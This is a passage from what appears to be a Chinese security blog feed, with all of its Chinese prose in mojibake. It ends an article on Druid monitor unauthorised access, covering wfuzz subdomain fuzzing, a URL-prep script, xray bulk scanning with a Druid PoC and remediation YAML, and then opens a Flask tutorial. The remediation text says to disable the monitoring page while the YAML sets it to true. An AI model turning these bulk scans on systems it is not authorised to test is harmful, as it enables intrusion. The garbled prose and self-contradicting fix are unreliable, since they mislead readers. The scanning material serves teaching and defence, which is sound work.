åœ¨å‘ç°ä¸€ä¸ªæœ‰æ•ˆçš„å“åº”æ—¶ï¼Œä¸ç«‹å³åœæ­¢ï¼Œè€Œæ˜¯ç»§ç»­æµ‹è¯•ï¼Œç›´åˆ°æ‰€æœ‰çš„æµ‹è¯•ç”¨ä¾‹éƒ½æ‰§è¡Œå®Œæ¯•ã€‚</li><li><code>-L</code>ï¼šè¿™ä¸ªå‚æ•°çš„ä½œç”¨æ˜¯åœ¨å‘ç°ä¸€ä¸ªæœ‰æ•ˆçš„å“åº”æ—¶ï¼Œæ‰“å°å‡ºè¯·æ±‚å’Œå“åº”çš„è¯¦ç»†ä¿¡æ¯ã€‚</li><li><code>-f è¾“å‡º.txt</code>ï¼šå°†å‘ç°çš„æ¼æ´æˆ–æœ‰æ•ˆå“åº”ä¿å­˜åˆ°æŒ‡å®šçš„æ–‡ä»¶ä¸­ã€‚</li><li><code>--conn-delay 5</code>ï¼šè®¾ç½®ä¸¤æ¬¡è¿ç»­è¯·æ±‚ä¹‹é—´çš„å»¶è¿Ÿæ—¶é—´ä¸º 5 ç§’ã€‚è¿™æœ‰åŠ©äºå‡å°‘å¯¹ç›®æ ‡æœåŠ¡å™¨çš„å‹åŠ›ï¼Œå¹¶é¿å…å› è¯·æ±‚é¢‘ç‡è¿‡é«˜è€Œè¢«æœåŠ¡å™¨é™åˆ¶ã€‚</li><li><code>http://FUZZ</code>ï¼šè¿™æ˜¯è¦æµ‹è¯•çš„ URL æ¨¡æ¿ï¼Œ<code>FUZZ</code> æ˜¯ä¸€ä¸ªå ä½ç¬¦ï¼Œ<code>wufuzz</code> ä¼šç”¨ <code>å­åŸŸå.txt</code> æ–‡ä»¶ä¸­çš„å­åŸŸåæ›¿æ¢å®ƒï¼Œç”Ÿæˆå®Œæ•´çš„ URL è¿›è¡Œæµ‹è¯•ã€‚</li></ul><p>ç»¼ä¸Šæ‰€è¿°ï¼Œè¿™æ¡å‘½ä»¤çš„ä½œç”¨æ˜¯ï¼šä½¿ç”¨ <code>wufuzz</code> å¯¹ä¸€ä¸ªæˆ–å¤šä¸ªå­åŸŸåè¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼Œæµ‹è¯•è¿‡ç¨‹ä¸­å¿½ç•¥ç‰¹å®šçš„ HTTP çŠ¶æ€ç ï¼Œè®¾ç½®è¶…æ—¶å’Œè¯·æ±‚å»¶è¿Ÿï¼Œå¹¶å°†å‘ç°çš„æ¼æ´æˆ–æœ‰æ•ˆå“åº”ä¿å­˜åˆ°æ–‡ä»¶ä¸­ã€‚è¿™ç§ç±»å‹çš„æµ‹è¯•é€šå¸¸ç”¨äºå‘ç° Web åº”ç”¨ç¨‹åºä¸­çš„å®‰å…¨æ¼æ´ï¼Œå¦‚è·¯å¾„éå†ã€ä¿¡æ¯æ³„éœ²ç­‰ã€‚</p></blockquote><p>é¢„å¤„ç†ä¸€ä¸‹wufzzçš„è¾“å‡ºç»“æœï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">spl</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span>saveFile<span class="token punctuation">)</span><span class="token punctuation">:</span>    openFile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>    saveFile <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>saveFile<span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span>    lines <span class="token operator">=</span> openFile<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> lines<span class="token punctuation">:</span>        x <span class="token operator">=</span> i<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        x1 <span class="token operator">=</span> <span class="token string">"http://"</span> <span class="token operator">+</span> x        saveFile<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span>x1<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>x1<span class="token punctuation">)</span>    saveFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    openFile<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    filePath <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Input your filepath: "</span><span class="token punctuation">)</span>    savePath <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Sava File name: "</span><span class="token punctuation">)</span>    spl<span class="token punctuation">(</span>filePath<span class="token punctuation">,</span>savePath<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hey BOY,Fighiting@@@"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-3-xrayæ‰¹é‡æ‰«æ"><a href="#3-3-xrayæ‰¹é‡æ‰«æ" class="headerlink" title="3.3 xrayæ‰¹é‡æ‰«æ"></a>3.3 xrayæ‰¹é‡æ‰«æ</h2><p>Xrayå•ç‹¬å¼€å¯Druidæ£€æµ‹æ’ä»¶ï¼Œè¿›è¡Œæ‰¹é‡æ£€æµ‹ï¼š</p><p>æŠŠconfig.yamlä¸­å…¶ä»–æ£€æµ‹éƒ½å…³æ‰ï¼Œæ¯”å¦‚SQLæ³¨å…¥ï¼ŒXSSæ³¨å…¥ç­‰ç­‰ï¼Œå¯ä»¥æ›´å¿«çš„æ›´æœ‰é’ˆå¯¹æ€§åªé’ˆå¯¹Druidæœªæˆæƒè¿›è¡Œæ£€æµ‹ã€‚</p><img src="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/%E6%88%AA%E5%B1%8F2024-12-05%2014.17.48.png" alt="config.yamlé…ç½®" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./xray webscan <span class="token parameter variable">--poc</span> poc-yaml-druid-monitor-unauth--url-file ./å­˜æ´»çš„å­åŸŸå.txt --html-output test.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>å‘½ä»¤è¯¦è§£ï¼š</p><p><code>xray</code> æ˜¯ä¸€ä¸ªå®‰å…¨è¯„ä¼°å·¥å…·ï¼Œç”±é•¿äº­ç§‘æŠ€å¼€å‘ï¼Œç”¨äºè‡ªåŠ¨åŒ–åœ°å‘ç°å’Œåˆ©ç”¨ Web åº”ç”¨ä¸­çš„å®‰å…¨æ¼æ´ã€‚ä¸‹é¢æ˜¯å‘½ä»¤ä¸­å„ä¸ªå‚æ•°çš„å«ä¹‰ï¼š</p><ul><li><code>./xray</code>ï¼šè¿™æ˜¯è°ƒç”¨ <code>xray</code> å·¥å…·çš„å‘½ä»¤è¡Œè°ƒç”¨ã€‚</li><li><code>webscan</code>ï¼šè¿™æ˜¯ <code>xray</code> çš„ä¸€ä¸ªå­å‘½ä»¤ï¼Œç”¨äºæ‰§è¡Œ Web åº”ç”¨çš„å®‰å…¨æ‰«æã€‚</li><li><code>--poc</code>ï¼šæŒ‡å®šè¦ä½¿ç”¨çš„æ¼æ´æ£€æµ‹è§„åˆ™ï¼ˆProof of Conceptï¼Œç®€ç§° PoCï¼‰ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ<code>poc-yaml-druid-monitor-unauth</code> æ˜¯ä¸€ä¸ª YAML æ–‡ä»¶ï¼ŒåŒ…å«äº†é’ˆå¯¹ Druid ç›‘æ§æœªæˆæƒè®¿é—®æ¼æ´çš„æ£€æµ‹è§„åˆ™ã€‚</li><li><code>--url-file</code>ï¼šæŒ‡å®šä¸€ä¸ªåŒ…å« URL çš„æ–‡ä»¶ï¼Œ<code>xray</code> å°†ä½¿ç”¨è¿™äº› URL ä½œä¸ºæµ‹è¯•çš„ç›®æ ‡ã€‚</li><li><code>./å­˜æ´»çš„å­åŸŸå.txt</code>ï¼šè¿™æ˜¯åŒ…å«å­˜æ´»å­åŸŸåçš„æ–‡ä»¶è·¯å¾„ï¼Œ<code>xray</code> å°†è¯»å–è¿™ä¸ªæ–‡ä»¶ä¸­çš„ URL å¹¶é’ˆå¯¹å®ƒä»¬æ‰§è¡Œå®‰å…¨æ‰«æã€‚</li><li><code>--html-output</code>ï¼šæŒ‡å®šè¾“å‡ºç»“æœçš„ HTML æ–‡ä»¶è·¯å¾„ã€‚</li><li><code>test.html</code>ï¼šè¿™æ˜¯è¾“å‡ºç»“æœçš„ HTML æ–‡ä»¶åï¼Œ<code>xray</code> å°†æŠŠæ‰«æç»“æœä»¥ HTML æ ¼å¼ä¿å­˜åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚</li></ul><p>ç»¼ä¸Šæ‰€è¿°ï¼Œè¿™æ¡å‘½ä»¤çš„ä½œç”¨æ˜¯ï¼šä½¿ç”¨ <code>xray</code> å·¥å…·ï¼Œé…åˆ Druid ç›‘æ§æœªæˆæƒè®¿é—®æ¼æ´çš„æ£€æµ‹è§„åˆ™ï¼Œå¯¹å­˜æ´»çš„å­åŸŸååˆ—è¡¨ä¸­çš„æ¯ä¸ª URL è¿›è¡Œå®‰å…¨æ‰«æï¼Œå¹¶å°†æ‰«æç»“æœä»¥ HTML æ ¼å¼è¾“å‡ºåˆ° <code>test.html</code> æ–‡ä»¶ä¸­ã€‚è¿™ç§ç±»å‹çš„æ‰«æå¯ä»¥å¸®åŠ©å‘ç° Web åº”ç”¨ä¸­çš„å®‰å…¨æ¼æ´ï¼Œç‰¹åˆ«æ˜¯é’ˆå¯¹ Druid ç›‘æ§æœªæˆæƒè®¿é—®çš„æ¼æ´ã€‚</p></blockquote><h1 id="å››ã€Druidæœªæˆæƒè®¿é—®æ¼æ´çš„ä¿®å¤"><a href="#å››ã€Druidæœªæˆæƒè®¿é—®æ¼æ´çš„ä¿®å¤" class="headerlink" title="å››ã€Druidæœªæˆæƒè®¿é—®æ¼æ´çš„ä¿®å¤"></a>å››ã€Druidæœªæˆæƒè®¿é—®æ¼æ´çš„ä¿®å¤</h1><ul><li><strong>æ–¹æ³•1</strong>ï¼šè®¾ç½®StatViewServletï¼ˆç›‘æ§é¡µé¢ï¼‰ä¸º<code>false</code>ï¼Œå³ç¦ç”¨ç›‘æ§é¡µé¢ã€‚</li></ul><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>  <span class="token key atrule">datasource</span><span class="token punctuation">:</span>    <span class="token key atrule">druid</span><span class="token punctuation">:</span>      <span class="token key atrule">stat-view-servlet</span><span class="token punctuation">:</span>        <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span> <span class="token comment"># æ˜¯å¦å¯ç”¨StatViewServlet(ç›‘æ§é¡µé¢)</span>        <span class="token key atrule">reset-enable</span><span class="token punctuation">:</span> <span class="token boolean important">false</span> <span class="token comment"># ç¦ç”¨HTMLé¡µé¢ä¸Šçš„"Reset All"åŠŸèƒ½</span>        <span class="token key atrule">login-username</span><span class="token punctuation">:</span> xxxx <span class="token comment"># è®¾ç½®è´¦æˆ·åç§°ï¼ˆå¢åŠ ç™»å½•æƒé™ï¼‰</span>        <span class="token key atrule">login-password</span><span class="token punctuation">:</span> xxxxxxxx <span class="token comment"># è®¾ç½®è´¦æˆ·å¯†ç </span>        <span class="token key atrule">allow</span><span class="token punctuation">:</span> 127.0.0.1 <span class="token comment"># IPç™½åå•</span>        <span class="token key atrule">deny</span><span class="token punctuation">:</span> 10.0.0.1 <span class="token comment"># IPé»‘åå•</span>        <span class="token key atrule">url-pattern</span><span class="token punctuation">:</span> <span class="token string">'/druid/*'</span> <span class="token comment"># è‡ªå®šä¹‰Druidè¿æ¥</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>æ–¹æ³•2</strong>ï¼šç»™Druidçš„Webé¡µé¢è®¾ç½®è´¦æˆ·å¯†ç ï¼Œå¢åŠ è®¿é—®Druidçš„æƒé™ã€‚è¿™ç§æ–¹æ³•æ¨èä½¿ç”¨ï¼Œå› ä¸ºå®ƒå…è®¸åœ¨é‰´æƒåä»ç„¶èƒ½å¤ŸæŸ¥çœ‹ç›‘æ§ä¿¡æ¯ã€‚</li></ul><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><ul><li><a href="https://github.com/alibaba/druid">Druid å®˜æ–¹æ–‡æ¡£</a></li><li><a href="https://developer.aliyun.com/">https://developer.aliyun.com/</a> é˜¿é‡Œäº‘å¼€å‘è€…ç¤¾åŒº</li><li><a href="https://cloud.tencent.com/developer/article/1771986">https://cloud.tencent.com/developer/article/1771986</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´çŸ¥è¯†åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´çŸ¥è¯†åº“ </tag>
            
            <tag> Druidæœªæˆæƒè®¿é—® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flaskæ¡†æ¶</title>
      <link href="/2024/12/04/qian-hou-duan-kai-fa/flask-kuang-jia/"/>
      <url>/2024/12/04/qian-hou-duan-kai-fa/flask-kuang-jia/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€Flaskç®€ä»‹"><a href="#ä¸€ã€Flaskç®€ä»‹" class="headerlink" title="ä¸€ã€Flaskç®€ä»‹"></a>ä¸€ã€Flaskç®€ä»‹</h1><h2 id="1-1-ä»€ä¹ˆæ˜¯Flaskï¼Ÿ"><a href="#1-1-ä»€ä¹ˆæ˜¯Flaskï¼Ÿ" class="headerlink" title="1.1 ä»€ä¹ˆæ˜¯Flaskï¼Ÿ"></a>1.1 ä»€ä¹ˆæ˜¯Flaskï¼Ÿ</h2><p>Flask æ˜¯ä¸€ä¸ªç”¨ <strong>Python</strong> ç¼–å†™çš„è½»é‡çº§ Web åº”ç”¨æ¡†æ¶ã€‚å®ƒéµå¾ª <strong>WSGIï¼ˆWeb Server Gateway Interfaceï¼‰</strong> è§„èŒƒï¼Œå¹¶ä½¿ç”¨ <strong>Jinja2</strong> æ¨¡æ¿å¼•æ“ã€‚Flask çš„è®¾è®¡å“²å­¦æ˜¯ç®€å•ã€çµæ´»ã€å¯æ‰©å±•ï¼Œé€‚ç”¨äºä»ç®€å•çš„åŸå‹å¼€å‘åˆ°å¤æ‚çš„ Web åº”ç”¨ã€‚</p><h2 id="1-2-Flask-çš„ç‰¹ç‚¹"><a href="#1-2-Flask-çš„ç‰¹ç‚¹" class="headerlink" title="1.2  Flask çš„ç‰¹ç‚¹"></a>1.2  Flask çš„ç‰¹ç‚¹</h2><ul><li><p><strong>è½»é‡çº§</strong>ï¼šFlask æ˜¯ä¸€ä¸ªå¾®æ¡†æ¶ï¼ˆMicroframeworkï¼‰ï¼Œæœ¬èº«åªæä¾›æ ¸å¿ƒåŠŸèƒ½ï¼Œå…¶ä»–åŠŸèƒ½é€šè¿‡æ‰©å±•å®ç°ï¼Œé¿å…äº†ä¸å¿…è¦çš„åŠŸèƒ½åŠ è½½ã€‚</p></li><li><p><strong>çµæ´»æ€§</strong>ï¼šFlask ä¸å¼ºåˆ¶å¼€å‘è€…éµå¾ªå›ºå®šçš„ç›®å½•ç»“æ„æˆ–ç¼–ç¨‹é£æ ¼ï¼Œå¼€å‘è€…å¯ä»¥æ ¹æ®éœ€è¦è‡ªç”±å®šåˆ¶ã€‚</p></li><li><p><strong>å†…ç½®å¼€å‘æœåŠ¡å™¨</strong>ï¼šæä¾›ä¸€ä¸ªç®€å•çš„å¼€å‘æœåŠ¡å™¨ï¼Œä¾¿äºå¿«é€Ÿå¯åŠ¨å’Œè°ƒè¯•ã€‚</p></li><li><p><strong>æ‰©å±•æ€§</strong>ï¼šæ”¯æŒä¸°å¯Œçš„æ‰©å±•åº“ï¼Œå¦‚æ•°æ®åº“ã€è®¤è¯ã€è¡¨å•éªŒè¯ç­‰ï¼Œè¿™äº›æ‰©å±•å¯ä¸ Flask æ— ç¼é›†æˆã€‚</p></li><li><p><strong>Jinja2 æ¨¡æ¿å¼•æ“</strong>ï¼šæ”¯æŒåŠ¨æ€ HTML é¡µé¢ç”Ÿæˆã€‚</p></li><li><p><strong>è·¯ç”±ç®¡ç†</strong>ï¼šå†…ç½®è·¯ç”±åŠŸèƒ½ï¼Œä¾¿äº URL æ˜ å°„åˆ°è§†å›¾å‡½æ•°ã€‚</p></li></ul><h2 id="1-3-æ ¸å¿ƒç»„ä»¶"><a href="#1-3-æ ¸å¿ƒç»„ä»¶" class="headerlink" title="1.3 æ ¸å¿ƒç»„ä»¶"></a>1.3 æ ¸å¿ƒç»„ä»¶</h2><ul><li><p><strong>Flask æ ¸å¿ƒå¯¹è±¡</strong>ï¼š<code>Flask</code> ç±»ç”¨äºåˆ›å»ºåº”ç”¨å®ä¾‹ã€‚</p></li><li><p><strong>è·¯ç”±ï¼ˆRoutingï¼‰</strong>ï¼šä½¿ç”¨ <code>@app.route</code> è£…é¥°å™¨å®šä¹‰ URL ä¸è§†å›¾å‡½æ•°çš„æ˜ å°„ã€‚</p></li><li><p><strong>æ¨¡æ¿å¼•æ“</strong>ï¼šä½¿ç”¨ Jinja2 æ¸²æŸ“ HTML æ¨¡æ¿ï¼Œå¹¶æ”¯æŒå˜é‡æ›¿æ¢å’Œæ§åˆ¶ç»“æ„ï¼ˆå¦‚å¾ªç¯ã€æ¡ä»¶ï¼‰ã€‚</p></li><li><p><strong>è¯·æ±‚ä¸å“åº”</strong>ï¼š<code>request</code> å¯¹è±¡ç”¨äºå¤„ç† HTTP è¯·æ±‚ï¼Œ<code>response</code> å¯¹è±¡ç”¨äºè¿”å›å“åº”ã€‚</p></li><li><p><strong>é”™è¯¯å¤„ç†</strong>ï¼šå†…ç½®é”™è¯¯å¤„ç†æœºåˆ¶ï¼Œå¯è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€‚</p></li></ul><h2 id="1-4-Flaskçš„ä¸»è¦æ‰©å±•"><a href="#1-4-Flaskçš„ä¸»è¦æ‰©å±•" class="headerlink" title="1.4 Flaskçš„ä¸»è¦æ‰©å±•"></a>1.4 Flaskçš„ä¸»è¦æ‰©å±•</h2><ul><li><p><strong>Flask-SQLAlchemy</strong>ï¼šORMï¼ˆå¯¹è±¡å…³ç³»æ˜ å°„ï¼‰å·¥å…·ï¼Œç”¨äºæ•°æ®åº“æ“ä½œã€‚</p></li><li><p><strong>Flask-WTF</strong>ï¼šå¤„ç†è¡¨å•å’Œ CSRF é˜²æŠ¤ã€‚</p></li><li><p><strong>Flask-Login</strong>ï¼šç”¨æˆ·è®¤è¯ä¸ç®¡ç†ã€‚</p></li><li><p><strong>Flask-Migrate</strong>ï¼šæ•°æ®åº“è¿ç§»ç®¡ç†ã€‚</p></li><li><p><strong>Flask-Mail</strong>ï¼šå¤„ç†é‚®ä»¶å‘é€ã€‚</p></li></ul><h2 id="1-5-é€‚ç”¨åœºæ™¯"><a href="#1-5-é€‚ç”¨åœºæ™¯" class="headerlink" title="1.5 é€‚ç”¨åœºæ™¯"></a>1.5 é€‚ç”¨åœºæ™¯</h2><ul><li><strong>å¿«é€ŸåŸå‹å¼€å‘</strong>ï¼šFlask è½»é‡ã€çµæ´»ï¼Œéå¸¸é€‚åˆå¿«é€ŸéªŒè¯äº§å“æ¦‚å¿µã€‚</li><li><strong>API å¼€å‘</strong>ï¼šä½¿ç”¨ Flask å¯ä»¥å¿«é€Ÿæ„å»º RESTful API æœåŠ¡ã€‚</li><li><strong>å°å‹ Web åº”ç”¨</strong>ï¼šé€‚åˆå¼€å‘ä¸­å°å‹ç½‘ç«™æˆ–åº”ç”¨ç¨‹åºã€‚</li><li><strong>å¾®æœåŠ¡æ¶æ„</strong>ï¼šç”±äºå…¶è½»é‡å’Œæ‰©å±•æ€§ï¼ŒFlask æ˜¯æ„å»ºå¾®æœåŠ¡çš„ç†æƒ³é€‰æ‹©ã€‚</li></ul><blockquote><p>ä»€ä¹ˆæ˜¯RESTful APIï¼Ÿ</p><p>RESTful APIæ˜¯ä¸€ç§è®¾è®¡ç®€æ´ã€æ˜“äºä½¿ç”¨çš„ç½‘ç»œæ¥å£é£æ ¼ï¼Œå®ƒé€šè¿‡HTTPæ–¹æ³•ï¼ˆå¦‚GETã€POSTã€PUTã€DELETEï¼‰è®©å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨äº¤æ¢æ•°æ®ã€‚è¿™ç§æ¥å£é£æ ¼éµå¾ªæ— çŠ¶æ€ã€ç»Ÿä¸€æ¥å£ç­‰åŸåˆ™ï¼Œä½¿å¾—ç½‘ç»œæœåŠ¡æ›´ç›´è§‚ã€é«˜æ•ˆã€‚</p><p>RESTful APIé€šå¸¸ä½¿ç”¨ä»¥ä¸‹HTTPæ–¹æ³•ï¼š</p><ul><li><strong>GET</strong>ï¼šè¯·æ±‚ä»æœåŠ¡å™¨æ£€ç´¢ç‰¹å®šèµ„æºã€‚GETè¯·æ±‚åº”è¯¥æ˜¯å®‰å…¨çš„ï¼Œä¸ä¼šäº§ç”Ÿå‰¯ä½œç”¨ã€‚</li><li><strong>POST</strong>ï¼šå‘æœåŠ¡å™¨æäº¤æ•°æ®ä»¥åˆ›å»ºæ–°èµ„æºã€‚</li><li><strong>PUT</strong>ï¼šæ›´æ–°æœåŠ¡å™¨ä¸Šçš„ç°æœ‰èµ„æºæˆ–åˆ›å»ºæ–°èµ„æºã€‚</li><li><strong>DELETE</strong>ï¼šä»æœåŠ¡å™¨åˆ é™¤èµ„æºã€‚</li><li><strong>PATCH</strong>ï¼šå¯¹èµ„æºè¿›è¡Œéƒ¨åˆ†ä¿®æ”¹ã€‚</li></ul><p>ä¾‹å­ï¼š</p><ol><li>GET /usersï¼šè·å–ç”¨æˆ·åˆ—è¡¨ã€‚</li><li>POST /usersï¼šåˆ›å»ºæ–°ç”¨æˆ·ã€‚</li><li>PUT /users/{id}ï¼šæ›´æ–°ç‰¹å®šç”¨æˆ·ä¿¡æ¯ã€‚</li><li>DELETE /users/{id}ï¼šåˆ é™¤ç‰¹å®šç”¨æˆ·ã€‚</li></ol><p>æ€»çš„æ¥è¯´ï¼ŒRESTful APIæ˜¯ä¸€ç§è®¾è®¡ç®€æ´ã€æ˜“äºç†è§£å’Œä½¿ç”¨çš„APIé£æ ¼ï¼Œå®ƒä½¿å¾—å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡æ›´åŠ ç›´è§‚å’Œé«˜æ•ˆã€‚</p></blockquote><h2 id="1-6-ä¸å…¶ä»–æ¡†æ¶çš„å¯¹æ¯”"><a href="#1-6-ä¸å…¶ä»–æ¡†æ¶çš„å¯¹æ¯”" class="headerlink" title="1.6 ä¸å…¶ä»–æ¡†æ¶çš„å¯¹æ¯”"></a>1.6 ä¸å…¶ä»–æ¡†æ¶çš„å¯¹æ¯”</h2><img src="/2024/12/04/qian-hou-duan-kai-fa/flask-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-04%2017.07.10.png" alt="Flask vs Django vs FastAPI" style="zoom:50%;"><p>Flask æ˜¯ä¸€ä¸ªéå¸¸é€‚åˆå¿«é€Ÿå¼€å‘ã€è½»é‡çº§ Web åº”ç”¨çš„æ¡†æ¶ã€‚å¦‚æœä½ éœ€è¦ä¸€ä¸ªç®€å•æ˜“ç”¨ã€çµæ´»å¯æ‰©å±•çš„ Python Web æ¡†æ¶ï¼ŒFlask æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„é€‰æ‹©ã€‚</p><h1 id="äºŒã€Flask-çš„åŸºæœ¬åº”ç”¨ç»“æ„"><a href="#äºŒã€Flask-çš„åŸºæœ¬åº”ç”¨ç»“æ„" class="headerlink" title="äºŒã€Flask çš„åŸºæœ¬åº”ç”¨ç»“æ„"></a>äºŒã€Flask çš„åŸºæœ¬åº”ç”¨ç»“æ„</h1><p>ä¸€ä¸ªç®€å•çš„ Flask åº”ç”¨ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token comment"># åˆ›å»º Flask åº”ç”¨å®ä¾‹</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token comment"># å®šä¹‰è·¯ç”±ä¸è§†å›¾å‡½æ•°</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"Hello, Flask!"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/greet/&lt;name&gt;'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">greet</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Hello, </span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">!"</span></span><span class="token comment"># å¯åŠ¨åº”ç”¨</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="ä¸‰ã€Flaskå¸¸ç”¨æ¨¡å—"><a href="#ä¸‰ã€Flaskå¸¸ç”¨æ¨¡å—" class="headerlink" title="ä¸‰ã€Flaskå¸¸ç”¨æ¨¡å—"></a>ä¸‰ã€Flaskå¸¸ç”¨æ¨¡å—</h1><h2 id="3-1-Flask"><a href="#3-1-Flask" class="headerlink" title="3.1 Flask"></a>3.1 Flask</h2><h3 id="3-1-1-Flaskç±»çš„åŸºæœ¬ä½¿ç”¨"><a href="#3-1-1-Flaskç±»çš„åŸºæœ¬ä½¿ç”¨" class="headerlink" title="3.1.1 Flaskç±»çš„åŸºæœ¬ä½¿ç”¨"></a>3.1.1 Flaskç±»çš„åŸºæœ¬ä½¿ç”¨</h3><p><strong>ç”¨é€”</strong>ï¼šæ ¸å¿ƒæ¨¡å—ï¼Œç”¨äºåˆ›å»ºå’Œç®¡ç† Flask åº”ç”¨ç¨‹åºã€‚</p><p><strong>ç¤ºä¾‹</strong>ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"Hello, Flask!"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>app = Flask(__name__)</code> æ˜¯ Flask åº”ç”¨çš„åŸºç¡€ä»£ç ï¼Œå®ƒç”¨äºåˆ›å»ºä¸€ä¸ª Flask åº”ç”¨å®ä¾‹ã€‚</p><h3 id="1-Flask-ç±»"><a href="#1-Flask-ç±»" class="headerlink" title="1. Flask ç±»"></a><strong>1. <code>Flask</code> ç±»</strong></h3><ul><li><code>Flask</code> æ˜¯ Flask æ¡†æ¶æä¾›çš„æ ¸å¿ƒç±»ï¼Œè´Ÿè´£å¤„ç† HTTP è¯·æ±‚ã€ç®¡ç†è·¯ç”±ã€åŠ è½½é…ç½®ç­‰åŠŸèƒ½ã€‚</li><li>é€šè¿‡å®ä¾‹åŒ– <code>Flask</code> ç±»ï¼Œå¯ä»¥ç”Ÿæˆä¸€ä¸ªåº”ç”¨å¯¹è±¡ï¼Œç”¨äºç»„ç»‡å’Œè¿è¡Œæ•´ä¸ª Web åº”ç”¨ã€‚</li></ul><h3 id="2-name-å‚æ•°"><a href="#2-name-å‚æ•°" class="headerlink" title="2. __name__ å‚æ•°"></a><strong>2. <code>__name__</code> å‚æ•°</strong></h3><ul><li><code>__name__</code>æ˜¯ Python çš„ç‰¹æ®Šå˜é‡ï¼Œç”¨äºæ ‡è¯†å½“å‰æ¨¡å—çš„åå­—ã€‚<ul><li>å¦‚æœè¯¥æ¨¡å—æ˜¯ç›´æ¥è¿è¡Œçš„è„šæœ¬ï¼Œ<code>__name__</code> çš„å€¼ä¸º 